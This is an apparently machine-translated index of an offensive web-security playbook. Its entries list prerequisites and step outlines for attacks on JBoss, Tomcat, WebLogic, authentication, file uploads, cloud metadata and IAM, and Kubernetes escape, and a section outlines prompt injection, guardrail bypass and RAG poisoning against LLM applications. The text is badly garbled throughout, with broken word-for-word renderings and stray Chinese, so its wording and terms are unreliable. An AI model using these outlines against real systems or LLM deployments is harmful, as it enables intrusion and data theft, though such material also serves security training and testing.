2. 2. useysoserialgeneratepayload
3. 3. Sendmaliciousrequest
4. 4. commonKeycolumntable
## JBossVulnerability Exploitation
- ID: jboss-vuln
- Difficulty: intermediate
- Subcategory: JBoss
- Tags: jboss, rce, java, deserialization
- Original Extracted Source: original extracted web-security-wiki source/jboss-vuln.md
Description:
JBossshould useServervulnerability
Prerequisites:
- useJBossServer
- existat/invulnerabilityversion
Execution Outline:
1. 1. JMXInvokerServletDeserialization
2. 2. JMX ConsoledeploymentWarPackage
3. 3. BSHDeployerdeployment
4. 4. usetool
## Apache Tomcatvulnerability
- ID: tomcat-vuln
- Difficulty: intermediate
- Subcategory: Tomcat
- Tags: tomcat, rce, java, manager
- Original Extracted Source: original extracted web-security-wiki source/tomcat-vuln.md
Description:
Apache TomcatServerVulnerability Exploitation
Prerequisites:
- useTomcatServer
- existat/invulnerabilityversionorconfiguration
Execution Outline:
1. 1. Manager Appweak口 make
2. 2. deploymentWarPackage
3. 3. CVE-2020-1938 Ghostcat
4. 4. PUTmethodanymeaning/intentFileWrite
## DjangoFrameworkvulnerability
- ID: django-vuln
- Difficulty: intermediate
- Subcategory: Django
- Tags: django, python, framework, sql
- Original Extracted Source: original extracted web-security-wiki source/django-vuln.md
Description:
DjangoFrameworksecurityvulnerability
Prerequisites:
- useDjangoFramework
- existat/invulnerabilityversion
Execution Outline:
1. 1. SQL Injection
2. 2. DebugpatterninformationLeak/Disclosure
3. 3. SECRET_KEYexploit
4. 4. Pathtraverse/iterate
## FlaskFrameworkvulnerability
- ID: flask-vuln
- Difficulty: intermediate
- Subcategory: Flask
- Tags: flask, python, framework, ssti
- Original Extracted Source: original extracted web-security-wiki source/flask-vuln.md
Description:
FlaskFrameworksecurityvulnerability
Prerequisites:
- useFlaskFramework
- existat/invulnerabilityconfiguration
Execution Outline:
1. 1. SSTITemplate Injection
2. 2. SECRET_KEYexploit
3. 3. DebugpatternRCE
4. 4. PINcodebypass
## WebLogic XMLDecoder
- ID: weblogic-xmldecoder
- Difficulty: intermediate
- Subcategory: WebLogic
- Tags: weblogic, xmldecoder, rce
- Original Extracted Source: original extracted web-security-wiki source/weblogic-xmldecoder.md
Description:
exploitWebLogic Servermiddle/centerXMLDecoderDeserialization Vulnerability(CVE-2017-10271/CVE-2017-3506)ImplementationRemote Code Execution
Prerequisites:
- goal/targetRunWebLogic Server
- existat/in/wls-wsat/or/_async/Path
- XMLDecoderComponentun-by (passive)Disable
- WebLogicversionexistat/invulnerability(10.3.6.0/12.1.3.0etc.)
Execution Outline:
1. detect/probeWebLogicversionandPath
2. CVE-2017-10271 XMLDecoder RCE
3. CVE-2019-2725 DeserializationRCE
4. WriteWebshellGethold久Permission

## References — web-playbook-06-request-smuggling

# requestwalk私
English: Request Smuggling
- Entry Count: 4
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## CL-TErequestwalk私
- ID: smuggling-cl-te
- Difficulty: advanced
- Subcategory: CL-TE
- Tags: smuggling, request, http
- Original Extracted Source: original extracted web-security-wiki source/smuggling-cl-te.md
Description:
Content-Lengthand/withTransfer-Encodingwalk私
Prerequisites:
- goal/targetusemulti/multiplelayerProxy
-  before/frontBackendprocess/handledifference
Execution Outline:
1. CL-TEfoundation/basis
2. TE-CLfoundation/basis
3. TE-TE
## CL-CLwalk私
- ID: smuggling-cl-cl
- Difficulty: advanced
- Subcategory: CL-CL
- Tags: smuggling, cl-cl, http
- Original Extracted Source: original extracted web-security-wiki source/smuggling-cl-cl.md
Description:
exploitFrontendProxyandBackendServersimultaneouslyprocess/handleContent-Lengthhead/top但 for/tomulti/multiple (counter)CLhead/top's/ofprocess/handledifferenceImplementationHTTP Request Smuggling
Prerequisites:
- existat/inFrontendProxy(like/such asHAProxy/Nginx)+BackendServer架construct
- 两end(side) for/toContent-Lengthhead/top's/ofparsingexistat/indifference
-  principle/logicuntie/solveHTTP Request Smugglingoriginal principle/logic
Execution Outline:
1. detectionCL-CLwalk私condition
2. CL-CLrequestwalk私POC
3. exploitCL-CLwalk私bypassFrontendAccesscontrol
## TE-CLwalk私
- ID: smuggling-te-cl
- Difficulty: expert
- Subcategory: TE-CL
- Tags: smuggling, te-cl, http
- Original Extracted Source: original extracted web-security-wiki source/smuggling-te-cl.md
Description:
exploitFrontenduseTransfer-Encoding而BackenduseContent-Length's/ofdifferenceImplementationHTTP Request Smuggling
Prerequisites:
- FrontendProxyadvantage firstprocess/handleTransfer-Encoding
- BackendServeradvantage firstprocess/handleContent-Length
-  principle/logicuntie/solvechunkedEncodingformat
Execution Outline:
1. detectionTE-CLdifference
2. TE-CLwalk私POC
3. TE-CLwalk私ImplementationrequestHijack
## TE-TEwalk私
- ID: smuggling-te-te
- Difficulty: expert
- Subcategory: TE-TE
- Tags: smuggling, te-te, http
- Original Extracted Source: original extracted web-security-wiki source/smuggling-te-te.md
Description:
exploitFrontendandBackend for/toTransfer-Encodinghead/top's/ofnotsame/togetherObfuscation变body's/ofprocess/handledifferenceImplementationrequestwalk私
Prerequisites:
-  before/frontBackendallsupportsTransfer-Encoding
- canvia/throughTEhead/topObfuscation makeoneend(side)ignoresTE
- (past tense)untie/solvechunkedEncodingandHTTPwalk私original principle/logic
Execution Outline:
1. TEObfuscation变bodydetect/probe
2. TE-TEwalk私exploit(FrontendignoresObfuscationTE)
3. TE-TEcache投毒attack

## References — web-playbook-07-authentication-vulnerabilities

# Authenticationvulnerability
English: Authentication Vulnerabilities
- Entry Count: 10
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## Authenticationbypass
- ID: auth-bypass
- Difficulty: intermediate
- Subcategory: Authenticationbypass
- Tags: auth, bypass, authentication
- Original Extracted Source: original extracted web-security-wiki source/auth-bypass.md
Description:
Webshould useAuthenticationbypasstechnique
Prerequisites:
- goal/targetexistat/inAuthenticationmachinemake/control
- AuthenticationImplementationexistat/indefect/flaw
Execution Outline:
1. SQL Injectionbypass
2. array bypass
3. typeconversion
4. JSONbypass
## brute force cracking
- ID: auth-brute
- Difficulty: beginner
- Subcategory: brute force cracking
- Tags: auth, brute-force, password
- Original Extracted Source: original extracted web-security-wiki source/auth-brute.md
Description:
Automatic-izePasswordguessattack
Prerequisites:
- no/withoutValidatecode
- no/withoutlockstrategy
Execution Outline:
1. Pitchfork
2. Cluster bomb
3. based onresponsedifference's/ofuser nameEnumeration
4. Validatecode/OTPbrute forceand/withbypass
## SessionHijack
- ID: auth-session
- Difficulty: intermediate
- Subcategory: Session Management
- Tags: auth, session, hijack
- Original Extracted Source: original extracted web-security-wiki source/auth-session.md
Description:
exploitSession Managementdefect/flawHijackorForgeuserSession，GetUnauthorized AccessPermission
Prerequisites:
- goal/targetusebased onCookieorToken's/ofSession Management
- can截获orpredictSessionidentifiersymbol/character
- networkcommonmessageun- completeall/fullEncryption(HTTP)orexistat/inXSS
Execution Outline:
1. SessionCookieattributeAnalysis
2. Sessionfixedattack(Session Fixation)
3. SessionHijack(HTTP嗅探)
4. Sessionpredict(weakfollowmachineproperty/nature)
## Password Resetvulnerability
- ID: auth-password-reset
- Difficulty: intermediate
- Subcategory: logicvulnerability
- Tags: auth, password-reset, logic
- Original Extracted Source: original extracted web-security-wiki source/auth-password-reset.md
Description:
bypassPassword Resetprocess
Prerequisites:
- Password Resetmeritcanexistat/inlogicdefect/flaw
Execution Outline:
1. Hosthead/top投毒
2. Tokenbrute force
3. Password ResetTokencanpredictproperty/natureAnalysis
4. Password Resetprocesslogicdefect/flaw
## OAuthvulnerability
- ID: auth-oauth
- Difficulty: advanced
- Subcategory: OAuth
- Tags: auth, oauth, redirect
- Original Extracted Source: original extracted web-security-wiki source/auth-oauth.md
Description:
OAuthAuthenticationprocessvulnerability
Prerequisites:
- useOAuthlogin
Execution Outline:
1. CSRFattack
2. Redirect URI
3. OAuth Stateparameterabsent/canpredictCSRF
4. Token窃take/getand/withScopeexceedright
## SAMLvulnerability
- ID: auth-saml
- Difficulty: advanced
- Subcategory: SAML
- Tags: auth, saml, xml
- Original Extracted Source: original extracted web-security-wiki source/auth-saml.md
Description:
SAMLbreak/judge speech/languageattack
Prerequisites:
- useSAML SSO
Execution Outline:
1. XMLSignaturebypass
2. XXEattack
3. SAML ResponseTamperand/withReplay
4. SAMLSignaturebypasshighlevel/gradetechnique
## 2FAbypass
- ID: auth-2fa
- Difficulty: intermediate
- Subcategory: 2FA
- Tags: auth, 2fa, mfa
- Original Extracted Source: original extracted web-security-wiki source/auth-2fa.md
Description:
bypassdouble because素Authentication
Prerequisites:
- Enable/On2FA
Execution Outline:
1. directreceive/connectAccess
2. Validatecodebrute force
3. logicbypass
## CAPTCHA Bypass
- ID: auth-captcha
- Difficulty: beginner
- Subcategory: Validatecode
- Tags: auth, captcha, bypass
- Original Extracted Source: original extracted web-security-wiki source/auth-captcha.md
Description:
bypassCAPTCHA
Prerequisites:
- existat/inValidatecode
Execution Outline:
1.  re-/heavy repeatuse
2. emptyvaluebypass
3. Deleteparameter
## rememberlive/stayIvulnerability
- ID: auth-remember-me
- Difficulty: intermediate
- Subcategory: Session Management
- Tags: auth, remember-me, cookie
- Original Extracted Source: original extracted web-security-wiki source/auth-remember-me.md
Description:
Remember Memeritcanvulnerability
Prerequisites:
- Enable/OnRemember Me
Execution Outline:
1. CookieForge
2. Base64Decoding
3. rememberlive/stayPasswordTokenReverseAnalysis
4. Shiro RememberMeDeserializationRCE
## JWTAuthenticationvulnerability
- ID: auth-jwt
- Difficulty: intermediate
- Subcategory: JWT
- Tags: auth, jwt, token
- Original Extracted Source: original extracted web-security-wiki source/auth-jwt.md
Description:
exploitJWT(JSON Web Token)Implementationdefect/flawForgeorTamperAuthenticationToken，ImplementationUnauthorized AccessorPrivilege Escalation
Prerequisites:
- goal/targetuseJWTadvancerowAuthentication
- canGetorInterceptJWTToken
- JWTLibraryexistat/inKnownvulnerabilityorServiceend(side)configurationnotwhen
Execution Outline:
1. JWTDecodingand/withAnalysis
2. Algorithm Noneattack
3. HS256Keybrute force
4. RS256→HS256AlgorithmObfuscationattack

## References — web-playbook-08-file-vulnerabilities

# Filevulnerability
English: File Vulnerabilities
- Entry Count: 7
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## FileUploadbypass
- ID: file-upload-bypass
- Difficulty: intermediate
- Subcategory: FileUpload
- Tags: upload, bypass, webshell
- Original Extracted Source: original extracted web-security-wiki source/file-upload-bypass.md
Description:
FileUploadlimitationbypasstechnique
Prerequisites:
- goal/targetexistat/inFileUploadmeritcan
- existat/inUploadlimitation
Execution Outline:
1. Extension namebypass
2. Content-Type
3. Graph (classifier)马
4. emptyformat/gridbypass
## anymeaning/intentFileDownload
- ID: file-download
- Difficulty: beginner
- Subcategory: Download
- Tags: file-download, lfi, leak
- Original Extracted Source: original extracted web-security-wiki source/file-download.md
Description:
exploitFileDownloadmeritcanmiddle/center's/ofPathcontroldefect/flawDownloadServerascend's/ofanymeaning/intentSensitiveFile
Prerequisites:
- goal/targetexistat/inFileDownloadmeritcan
- FilePathparametercancontrol
- Serviceend(side)un- for/toPathadvancerow严format/gridFilter
Execution Outline:
1. identifyFileDownloadinterface
2. Pathtraverse/iterateDownloadSensitiveFile
3. DownloadSourcecodeand/withDatabaseconfiguration
4. Automatic-izeBatchSensitiveFiledetect/probe
## condition竞争
- ID: file-competition
- Difficulty: advanced
- Subcategory: Race Condition
- Tags: race-condition, file-upload
- Original Extracted Source: original extracted web-security-wiki source/file-competition.md
Description:
exploitFileUpload/process/handleprocessmiddle/center's/of竞态condition(Race Condition)，at/insecurityInspect/Checkand/withFileusebetween's/oftime窗口inner/insideExecutemaliciousoperation
Prerequisites:
- goal/targetexistat/inFileUploadmeritcan
- Serviceend(side) firstUpload after/backInspect/Check's/ofprocess/handleprocess
- canhighConcurrentAccessUpload's/ofFile
- (past tense)untie/solvetemporaryFilestorePath
Execution Outline:
1. identify竞态condition窗口
2. 竞态conditionexploit - Uploadand/withAccessConcurrent
3. PythonConcurrent竞态exploitfootthis
4. .htaccess竞态Write
## Pathtraverse/iterate
- ID: file-traversal
- Difficulty: beginner
- Subcategory: Traversal
- Tags: traversal, file
- Original Extracted Source: original extracted web-security-wiki source/file-traversal.md
Description:
exploitPathtraverse/iterate(../)序column突破FileAccess's/ofDirectorylimitation，ReadorWriteWeb (classifier)Directory with/byout's/ofanymeaning/intentFile
Prerequisites:
- goal/targetexistat/inFileRead/includes/containsmeritcan
- FilePathparametercancontrol
- Serviceend(side)PathFilternot严format/grid
Execution Outline:
1. foundation/basisPathtraverse/iterateTest
2. EncodingbypassPathFilter
3. Windowsspecialhas/havePathtraverse/iterate
4. LFI toRCEUpgrade
## Zip Slip
- ID: file-zip-slip
- Difficulty: intermediate
- Subcategory: Zip
- Tags: zip-slip, file, rce
- Original Extracted Source: original extracted web-security-wiki source/file-zip-slip.md
Description:
exploitmaliciousconstruct's/ofCompressionPackageFile(ZIP/TAR)middle/center's/ofPathtraverse/iterateImplementationanymeaning/intentFileWrite，覆stampServerascend's/of close/shutkeyFileorWriteWebshell
Prerequisites:
- goal/targetexistat/inZIP/TARFileUpload并AutomaticDecompressionmeritcan
- DecompressionLibraryun- for/toFile namemiddle/center's/ofPathtraverse/iterateadvancerowFilter
- (past tense)untie/solveWeb (classifier)Directoryorother close/shutkeyDirectory's/ofPath
Execution Outline:
1. detect/probeZIPUploadandDecompressionmeritcan
2. constructZip SlipmaliciousCompressionPackage
3. Upload并ValidateZip Slip
4. TARPackageZip Slip变body
## MIMEtypebypass
- ID: file-mime
- Difficulty: beginner
- Subcategory: MIME
- Tags: mime, bypass
- Original Extracted Source: original extracted web-security-wiki source/file-mime.md
Description:
via/throughForgeMIMEtype(Content-Type)bypassFileUpload's/oftypeInspect/Check，UploadmaliciouscanExecuteFile
Prerequisites:
- goal/targetexistat/inFileUploadmeritcan
- Serviceend(side)onlyvia/throughContent-Typejudgebreak/judgeFiletype
- (past tense)untie/solvegoal/targetallows's/ofMIMEtype
Execution Outline:
1. detect/probeFiletypeInspect/Checkmachinemake/control
2. MIMEtypeForgeUploadWebshell
3. Magic BytesForge
4. ValidateUploadresult/outcome
## emptybyte截break/judge
- ID: file-null-byte
- Difficulty: intermediate
- Subcategory: Null Byte
- Tags: null-byte, bypass
- Original Extracted Source: original extracted web-security-wiki source/file-null-byte.md
Description:
exploitemptybyte(%00/\x00)截break/judgeFile name's/ofExtension nameValidate，bypassFileUpload白 namesinglelimitation
Prerequisites:
- goal/targetuse白 namesingleValidateFileExtension name
- Backend language speech/languageorLibraryreceiveemptybyte截break/judgeimpact(PHP<5.3.4, Javaoldversion)
- Serviceend(side)at/inPathjoinreceive/connectmiddle/centerexistat/in截break/judgepoint
Execution Outline:
1. emptybyte截break/judgeoriginal principle/logicand/withenvironmentdetection
2. FileUploademptybyte截break/judge
3. file inclusionemptybyte截break/judge
4. presentgeneration/proxy替generation/proxysolution(PHP>=5.3.4)

## References — web-playbook-09-business-logic-vulnerabilities

# Business Logic Vulnerability
English: Business Logic Vulnerabilities
- Entry Count: 5
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## IDORPrivilege Escalation
- ID: biz-idor
- Difficulty: beginner
- Subcategory: exceedrightvulnerability
- Tags: IDOR, exceedright, 业务logic, OWASP, A01
- Original Extracted Source: original extracted web-security-wiki source/biz-idor.md
Description:
insecure's/ofdirectreceive/connect for/to象citation(IDOR)，via/throughTamperrequestparametermiddle/center's/of for/to象IDPrivilege Escalationother人data。Attackercantraverse/iterateuserID、Ordernumberetc.parameterGetunauthorizedresourceSource。
Prerequisites:
- goal/targetexistat/inbased onID's/ofresourceSourceAccessinterface
- logged inregular/normaluseraccount
Execution Outline:
1. 1. identifycantraverse/iterateparameter
2. 2. Horizontal Privilege EscalationTest
3. 3. Vertical Privilege EscalationTest
4. 4. parameter污染exceedright
## 竞态conditionattack
- ID: biz-race-condition
- Difficulty: intermediate
- Subcategory: 竞态condition
- Tags: 竞态condition, Race Condition, TOCTOU, Concurrent, 业务logic
- Original Extracted Source: original extracted web-security-wiki source/biz-race-condition.md
Description:
exploitServiceend(side)TOCTOU(Time-of-Check to Time-of-Use)vulnerability，via/throughConcurrentrequestat/inInspect/Checkand/withExecutebetween's/oftime窗口inner/insidemulti/multiple next/timetriggersame/togetheroneoperation，Implementation re-/heavy repeatlead券、 re-/heavy repeatWithdrawal、superextra购买etc.业务logic突破。
Prerequisites:
- goal/targetexistat/inBalance/积 part/point/Couponetc.canquantity/measure-izeresourceSourceoperation
- Python/Turbo Intruderenvironment
Execution Outline:
1. 1. identify竞态goal/target
2. 2. PythonConcurrentTestfootthis
3. 3. Burp Turbo IntruderTest
4. 4. Validate竞态 become/successmerit
## Payment LogicTamper
- ID: biz-payment-tamper
- Difficulty: intermediate
- Subcategory: 支付security
- Tags: 支付, AmountTamper, 业务logic, 0元购, 电商security
- Original Extracted Source: original extracted web-security-wiki source/biz-payment-tamper.md
Description:
via/throughModify支付requestmiddle/center's/ofAmount、numberquantity/measure、Discountetc.parametercomeoperate纵Transaction Logic。common at/in电商platformandonline支付systemmiddle/center，canleads to0元购、defeatpriceformat/grid、Discount叠addetc.严 re-/heavy业务risk。
Prerequisites:
- goal/targetexistat/in支付/descendsinglemeritcan
- canInterceptandModifyHTTPrequest
Execution Outline:
1. 1. AmountTamperTest
2. 2. numberquantity/measureand/with运费Tamper
3. 3. Coupon叠addand/withReplace
4. 4. 支付return调Tamper
## Password Resetlogicdefect/flaw
- ID: biz-password-reset
- Difficulty: intermediate
- Subcategory: Authenticationdefect/flaw
- Tags: Password Reset, Authenticationbypass, 业务logic, Validatecode, HostInject
- Original Extracted Source: original extracted web-security-wiki source/biz-password-reset.md
Description:
Password Resetprocessmiddle/center's/oflogicvulnerability，includingResetTokenLeak/Disclosure、Validatecodebrute force、responseoperate纵、Hosthead/topInjectetc.attack手 method/law，canImplementationanymeaning/intentuserPassword Reset。
Prerequisites:
- goal/targetexistat/inPassword Reset/找returnmeritcan
- canInterceptHTTPrequest
Execution Outline:
1. 1. Hosthead/topInject窃take/getResetlink
2. 2. Validatecodebrute force
3. 3. responseoperate纵bypass
4. 4. ResetTokenweakfollowmachineproperty/nature
## CAPTCHA Bypasstechnique
- ID: biz-captcha-bypass
- Difficulty: beginner
- Subcategory: Validatecodesecurity
- Tags: Validatecode, CAPTCHA, bypass, SMS Verification Code, 人machineValidate
- Original Extracted Source: original extracted web-security-wiki source/biz-captcha-bypass.md
Description:
bypassCAPTCHA、SMS Verification Code、滑moveValidateetc.人machineValidatemachinemake/control's/ofeach kind/typetechnique手 method/law，includingresponseLeak/Disclosure、 repeat useattack、OCRidentify、logicdefect/flawexploitetc.。
Prerequisites:
- goal/targetexistat/inValidatecodeprotection's/ofmeritcan
- Pythonenvironment
Execution Outline:
1. 1. ValidatecoderesponseLeak/Disclosure
2. 2. Validatecode repeat useattack
3. 3. DeleteValidatecodeparameter
4. 4. ten thousandcanValidatecode

## References — web-playbook-10-prototype-pollution

# original typechain污染
English: Prototype Pollution
- Entry Count: 3
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## Serviceend(side)original typechain污染 toRCE
- ID: proto-server-rce
- Difficulty: advanced
- Subcategory: Serviceend(side)exploit
- Tags: original typechain, Prototype Pollution, RCE, Node.js, __proto__
- Original Extracted Source: original extracted web-security-wiki source/proto-server-rce.md
Description:
via/through污染JavaScript for/to象original typechain(__proto__/constructor.prototype)Injectmaliciousattribute，at/inNode.jsServiceend(side)exploitchild_processorEJS/Pugetc.templatelead/guide擎's/ofgadgetchainImplementationRemote Code Execution。
Prerequisites:
- goal/targetuseNode.js
- existat/inJSONMerge/deepcopycopyoperation
- cancontrolJSONinputenter
Execution Outline:
1. 1. detectionoriginal typechain污染point
2. 2. EJStemplatelead/guide擎RCE Gadget
3. 3. Pugtemplatelead/guide擎RCE Gadget
4. 4. general/universalDoS/informationLeak/DisclosureGadget
## Clientoriginal typechain污染 toXSS
- ID: proto-client-xss
- Difficulty: advanced
- Subcategory: Clientexploit
- Tags: original typechain, XSS, Client, jQuery, DOM, Prototype Pollution
- Original Extracted Source: original extracted web-security-wiki source/proto-client-xss.md
Description:
via/throughURLparameter、postMessageorDOMoperation污染FrontendJavaScriptoriginal typechain，exploitjQuery/DOMoperationLibrary's/ofgadgetat/inClientImplementationXSS。Attackercanvia/through精心construct's/ofURLlink诱guideVictimtriggervulnerability。
Prerequisites:
- goal/targetFrontenduseeasyreceiveimpact's/ofJSLibrary
- existat/inURLparameter to for/to象conversion's/oflogic
Execution Outline:
1. 1. identifyClient污染Source
2. 2. jQuery html() Gadget
3. 3. DOMPurifybypassGadget
4. 4. Automatic-izedetectionfootthis
## original typechain污染tie/knotcombineNoSQL Injection
- ID: proto-nosql-injection
- Difficulty: expert
- Subcategory: combinationexploit
- Tags: original typechain, NoSQL, MongoDB, Authenticationbypass, combination attack
- Original Extracted Source: original extracted web-security-wiki source/proto-nosql-injection.md
Description:
will/shalloriginal typechain污染and/withMongoDB/NoSQL Injectioncombinationexploit。via/through污染query for/to象's/oforiginal typechainattribute，bypassAuthenticationlogicorconstructmaliciousquerycondition，ImplementationAuthenticationbypassanddataLeak/Disclosure。
Prerequisites:
- goal/targetuseMongoDB
- existat/inoriginal typechain污染point
- existat/inqueryconstructlogic
Execution Outline:
1. 1. identifyMongoDBqueryInjectpoint
2. 2. original typechain污染bypassqueryvalidate
3. 3. 布尔Blind Injectionextractdata
4. 4. DatabaseEnumerationand/withExport

## References — web-playbook-11-cloud-security-vulnerabilities

# 云securityvulnerability
English: Cloud Security Vulnerabilities
- Entry Count: 4
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## 云SSRF窃take/getMetadataCredential
- ID: cloud-ssrf-metadata
- Difficulty: intermediate
- Subcategory: IMDSattack
- Tags: 云security, SSRF, AWS, GCP, Azure, IMDS, Metadata
- Original Extracted Source: original extracted web-security-wiki source/cloud-ssrf-metadata.md
Description:
exploitSSRFvulnerabilityAccess云Service(AWS/GCP/Azure)'s/ofinstanceMetadataService(IMDS)GettemporaryIAMCredential。Attackercanvia/throughGet's/ofAccess Keyreceive/connect管云resourceSource，Implementation fromWebvulnerability to云environment's/of横 to/towardsUpgrade。
Prerequisites:
- goal/targetRunat/in云environment
- existat/inSSRFvulnerability
- instanceBind(past tense)IAMrole
Execution Outline:
1. 1. AWSMetadataServicedetect/probe
2. 2. GCP/AzureMetadataexploit
3. 3. exploitGet's/ofCredentialLateral Movement
4. 4. deepdegree/measureexploit——S3dataLeak/Disclosure/Privilege Escalation
## S3store桶configurationerror/mistakeexploit
- ID: cloud-s3-misconfig
- Difficulty: beginner
- Subcategory: S3security
- Tags: 云security, S3, AWS, configurationerror/mistake, dataLeak/Disclosure
- Original Extracted Source: original extracted web-security-wiki source/cloud-s3-misconfig.md
Description:
exploitAWS S3store桶's/ofAccesscontrolconfigurationerror/mistake(Public读/write/column举)GetSensitivedataor植entermaliciousFile。common at/instaticnetworkstandhost、LogstoreandBackup桶，cancanleads todataLeak/Disclosure、networkstandTamperorSupply Chain Attack。
Prerequisites:
- Knowngoal/targetS3桶 name
- AWS CLIorHTTPAccess
Execution Outline:
1. 1. S3桶 nameEnumeration
2. 2. PermissionEnumeration
3. 3. SensitivedataSearch
4. 4. Validateexploit（staticnetworkstandTamper/XSS）
## AWS IAMPrivilege Escalation
- ID: cloud-iam-escalation
- Difficulty: advanced
- Subcategory: IAMprivilege escalation
- Tags: 云security, AWS, IAM, Privilege Escalation, Privilege Escalation
- Original Extracted Source: original extracted web-security-wiki source/cloud-iam-escalation.md
Description:
at/inalreadyGetlowPermissionAWSCredential after/back，exploitIAMstrategymiddle/center's/of past/excessivedegree/measureAuthorization(like/such asiam:PassRole、lambda:CreateFunctionetc.)ImplementationPrivilege Escalationarrivemanagemember。涵stamp20+ kind/typeKnown's/ofAWS IAMprivilege escalationPath。
Prerequisites:
- alreadyGetAWSCredential
- IAMstrategyexistat/in past/excessivedegree/measureAuthorization
Execution Outline:
1. 1. Enumerationwhen before/frontPermission
2. 2. iam:PassRole + Lambdaprivilege escalation
3. 3. otherprivilege escalationPath
4. 4. Automatic-izePrivilege Escalation Tool
## Kubernetescontainerescape/evasion
- ID: cloud-k8s-escape
- Difficulty: expert
- Subcategory: containersecurity
- Tags: 云security, Kubernetes, containerescape/evasion, Docker, privilegecontainer
- Original Extracted Source: original extracted web-security-wiki source/cloud-k8s-escape.md
Description:
at/inalreadyGetKubernetes Pod Shell's/ofpremisedescend，exploitconfigurationerror/mistake(privilegecontainer、Mount宿hostPath、ServiceAccounthighPermission)Implementationcontainerescape/evasion，furthermorecontrol宿hostorwhole/integer (counter)Kubernetescluster。
Prerequisites:
- alreadyGetPodinner/insideShell
- Podexistat/inconfigurationerror/mistake
Execution Outline:
1. 1. containerenvironmentReconnaissance
2. 2. privilegecontainerescape/evasion
3. 3. exploitServiceAccountreceive/connect管cluster
4. 4. CreateprivilegePodReverseShell

## References — web-playbook-12-ai-security

# AIsecurity
English: AI Security
- Entry Count: 4
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## LLMTipInjectattack
- ID: ai-prompt-injection
- Difficulty: beginner
- Subcategory: TipInject
- Tags: AI, LLM, Prompt Injection, ChatGPT, TipInject
- Original Extracted Source: original extracted web-security-wiki source/ai-prompt-injection.md
Description:
via/through精心construct's/ofuserinputenter覆stamporbypassLLM(large language speech/languagemodule type)'s/ofsystemTip(System Prompt)， makeAIExecutenon-预期's/ofoperation。includingdirectreceive/connectInject(DPI)andbetweenreceive/connectInject(IPI)，canleads tosystemTipLeak/Disclosure、security护栏bypass、dataLeak/Disclosureandunauthorizedoperation。
Prerequisites:
- goal/targetshould useintegrated(past tense)LLM
- canand/withLLMinteractiveinputenter文this
Execution Outline:
1. 1. systemTipLeak/Disclosure
2. 2. security护栏bypass
3. 3. betweenreceive/connectTipInject(IPI)
4. 4. exploitAItoolcall/invoke(Function Calling)
## AImodule type窃take/getand/with推 principle/logicattack
- ID: ai-model-extraction
- Difficulty: advanced
- Subcategory: module typeattack
- Tags: AI, module type窃take/get, Model Extraction,  become/successmemberinference, API滥 use
- Original Extracted Source: original extracted web-security-wiki source/ai-model-extraction.md
Description:
via/throughlargequantity/measure精心construct's/ofquery for/toAImodule typeadvancerow黑盒attack，窃take/getmodule typeparameter(Model Extraction)、inference训练data(Membership Inference)ordiscovermodule typedecidestrategyboundary/perimeter。Attackercanthisbuildmeritcanetc.price's/of替generation/proxymodule typeorextractprivacydata。
Prerequisites:
- goal/targetprovideAI推 principle/logicAPI
- APIreturns概率/placemessagedegree/measure part/pointnumber
Execution Outline:
1. 1. APIdetect/probeand/withcan力Analysis
2. 2. module type窃take/get(Model Extraction)
3. 3.  become/successmemberinferenceattack(MIA)
4. 4. 训练dataextract
##  for/to抗样thisattack
- ID: ai-adversarial
- Difficulty: expert
- Subcategory:  for/to抗attack
- Tags: AI,  for/to抗样this, Adversarial, FGSM, Evasion
- Original Extracted Source: original extracted web-security-wiki source/ai-adversarial.md
Description:
via/through to/towardsinputenterdatamiddle/centerAdd人 category/classnotcan感know's/ofmicrosmall扰move， makeAImodule typeproduceserror/mistake's/ofpredictresult/outcome。 for/to抗样thisattackcanshouldused for/forGraph像classification、文thisAnalysis、 language音identifyetc.multipleAImodule type，threatAutomatic驾驶、securitydetectionandcontentauditsystem。
Prerequisites:
- goal/targetuseAIadvancerowAutomatic-izedecidestrategy
- cancontrolinputenterdata
Execution Outline:
1. 1. 白盒attack——FGSM
2. 2. 黑盒attack——based onquery
3. 3. 文this for/to抗attack
4. 4. 物 principle/logic世boundary for/to抗attack
## RAG投毒and/withknowledge baseInject
- ID: ai-rag-poisoning
- Difficulty: intermediate
- Subcategory: RAGattack
- Tags: AI, RAG, knowledge base, VectorDatabase, data投毒
- Original Extracted Source: original extracted web-security-wiki source/ai-rag-poisoning.md
Description:
针 for/touseRAG(Retrieval-Augmented Generation)架construct's/ofAIshould use，via/through投毒knowledge basemiddle/center's/ofdocumentcomeimpactAI's/ofreturnanswer。Attackercanat/inVectorDatabasemiddle/centerInjectincludes/containsmalicious指 make's/ofdocument，whenuserquerytrigger检索time，maliciousdocumentby (passive)Inject toAIcontextmiddle/centerExecutebetweenreceive/connectTipInject。
Prerequisites:
- goal/targetuseRAG架construct
- can to/towardsknowledge baseCommitdocument
- (past tense)untie/solveRAG检索machinemake/control
Execution Outline:
1. 1. RAG架constructidentifyand/withAnalysis
2. 2. knowledge base投毒——Injectmaliciousdocument
3. 3. trigger投毒document检索
4. 4. VectorDatabasedirectreceive/connectattack

## References — web-playbook-13-api-security

# APIsecurity
English: API Security
- Entry Count: 12
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## JWTsecurityvulnerability
- ID: jwt-security
- Difficulty: intermediate
- Subcategory: JWT
- Tags: jwt, token, authentication
- Original Extracted Source: original extracted web-security-wiki source/jwt-security.md
Description:
JSON Web TokensecurityVulnerability Exploitation
Prerequisites:
- useJWTadvancerowAuthentication
- JWTconfigurationorValidateexistat/inissue/problem
Execution Outline:
1. 1. DecodingJWT
2. 2. NoneAlgorithmattack
3. 3. weakKeycrack
4. 4. KeyObfuscationattack
## GraphQLInjectattack
- ID: graphql-injection
- Difficulty: intermediate
- Subcategory: GraphQL
- Tags: graphql, api, injection, introspection
- Original Extracted Source: original extracted web-security-wiki source/graphql-injection.md
Description:
GraphQL APIInjectand/withinformationLeak/Disclosureattack
Prerequisites:
- goal/targetuseGraphQL API
- existat/inUnauthorized AccessorInjectpoint
Execution Outline:
1. 1. detect/probeGraphQLend(side)point
2. 2. inner/inside省query
3. 3. Batchqueryattack
4. 4. SQL Injection
